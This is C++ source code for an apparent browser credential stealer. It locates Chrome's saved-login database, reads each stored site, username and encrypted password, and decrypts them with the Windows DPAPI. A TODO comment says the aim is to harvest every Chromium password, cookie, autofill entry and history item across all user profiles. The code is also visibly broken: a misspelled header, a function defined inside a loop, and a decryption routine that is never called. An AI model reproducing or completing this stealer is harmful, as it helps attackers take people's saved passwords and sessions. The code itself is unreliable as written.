#include <windows.h>
#include <shlobj.h>  
#include <iostream>
#include <fstream>
#include <sqlite.3h>
#include <iostream>
#include <wincrypt.h>
//TODO IF THIS STUFF WORKS: All chromium based passwords, cookies, autofill, and web history from all user profiles

// get the chrome sqlite database path
std::string get_chrome_profile_path() {
    char path[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
    return std::string(path) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
}

// copy the chrome sqlite database to a temporary location
void copy_file(const std::string& source, const std::string& dest) {
    std::ifstream src(source, std::ios::binary);
    std::ofstream dst(dest, std::ios::binary);
    dst << src.rdbuf();
}

// read the passwords from the chrome sqlite database
void read_passwords(const std::string& database_path) {
    sqlite3* db;
    sqlite3_open(database_path.c_str(), &db);

    const char* query = "SELECT origin_url, username_value, password_value FROM logins";
    sqlite3_stmt* stmt;
    // execute the query
    if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
        // iterate over the results
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            // get the url, username, and encrypted password
            std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
            std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
            const unsigned char* password_blob = sqlite3_column_blob(stmt, 2);
            int blob_length = sqlite3_column_bytes(stmt, 2);

            std::string decrypt_password(const BYTE* encrypted, DWORD length) {
                DATA_BLOB in_blob;
                DATA_BLOB out_blob;
                in_blob.pbData = const_cast<BYTE*>(encrypted);
                in_blob.cbData = length;

                if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
                    std::string password(reinterpret_cast<char*>(out_blob.pbData), out_blob.cbData);
                    LocalFree(out_blob.pbData);
                    return password;
                }
                return "[Failed to decrypt]";
            }

            std::cout << "URL: " << url << " Username: " << username << " Password: [encrypted]" << std::endl;
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
}


